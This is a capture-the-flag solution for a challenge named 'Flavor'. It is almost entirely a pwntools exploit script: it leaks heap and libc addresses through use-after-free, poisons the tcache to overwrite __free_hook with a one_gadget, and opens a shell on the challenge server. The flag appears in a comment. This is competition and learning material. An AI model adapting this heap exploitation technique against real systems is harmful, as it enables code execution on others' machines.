# Flavor
## TLDR
Tcache poisoning

## Complete write up
To do soon

## Solution
```py
#!/usr/bin/python2
from pwn import *
from sys import *

exe = ELF("vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.arch = "amd64"
# context.arch = "i386"
# context.log_level = 'DEBUG'
e = ELF('vuln')
if(len(argv) == 2):
    p = connect("193.57.159.27", 61642)
else:
    p = process('vuln_patched')

'''
DO{th3_s3c0nd_h4rd3st_p4rt_0f_m4k1ng_4_ch4llenge_1s_c0ming_up_w1th_4n_1nt3r3st1ng_fl4g...}
'''


def buy(idx):
    p.recvuntil("> ")
    p.sendline('b')
    p.sendline(str(idx))

def Buy(idx):
    p.recvuntil("> ")
    p.sendline('B')
    p.sendline(str(idx))

def sell(idx):
    p.recvuntil("> ")
    p.sendline('s')
    p.sendline(str(idx))

def edit(idx, price, name):
    p.recvuntil("> ")
    p.sendline('e')
    p.sendline(str(idx))
    p.sendline(str(price))
    p.sendline(name)


def view(idx):
    p.recvuntil("> ")
    p.sendline('v')
    p.sendline(str(idx))
    p.recvuntil(": ")

    name = p.recvuntil("\nID", drop=True)
    
    p.recvuntil(": ")
    ide = p.recvuntil("\nP", drop=True)


    p.recvuntil("$")
    price = p.recvuntil("\n=", drop=True)
    return name, ide, price

# bin 0
buy(0)
# bin 1
Buy(1)

edit(0, 100, 'AAAA')
sell(0)

edit(0, 100, 'AAAA')
sell(0)

print view(0)
heapleak = eval(view(0)[1])
print hex(heapleak)

# Full tcache
edit(0, 100, 'AAAA')
sell(0)

edit(0, 100, 'AAAA')
sell(0)

edit(0, 100, 'AAAA')
sell(0)

edit(0, 100, 'AAAA')
sell(0)

edit(0, 100, 'AAAA')
sell(0)

# go to unsorted bin
edit(0, 100, 'AAAA')
sell(0)

sell(1)

# leak libc
libcleak = eval(view(0)[1])
print hex(libcleak)
libc.address = libcleak - (libc.sym.main_arena+96)
print hex(libc.address)

edit(1, 0x42424242, 'AAAAAAAAAAAAAAAAAAA')
sell(1)
edit(1, 0x42424242, 'AAAAAAAAAAAAAAAAAAA')

edit(1, 100, 'AAAA')
sell(1)

edit(1, 100, 'AAAA')
sell(1)

edit(0, 0, '/bin/sh')

Buy(libc.sym['__free_hook'])

Buy(libc.address + 0xe6c81)
Buy(libc.address + 0xe6c81)

cmd = """
heap-analysis-helper
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)

sell(0)

p.interactive()
```